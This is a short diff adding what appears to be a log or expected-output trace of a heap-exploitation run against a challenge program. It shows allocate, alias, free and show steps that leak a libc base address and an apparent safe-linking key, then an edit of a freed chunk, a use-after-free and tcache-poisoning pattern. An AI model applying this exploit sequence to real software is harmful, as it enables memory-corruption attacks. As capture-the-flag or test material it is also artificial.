@@ -1,0 +1,15 @@
+pid 2583
+store 0 0x500
+store 1 0x20
+entangle 0 2
+erase 0
+show 2
+libc 0x7e2669639000
+store 3 0x10
+entangle 3 4
+erase 3
+show 4
+key16 0x55557bd79
+edit 4
+erase 4
+done
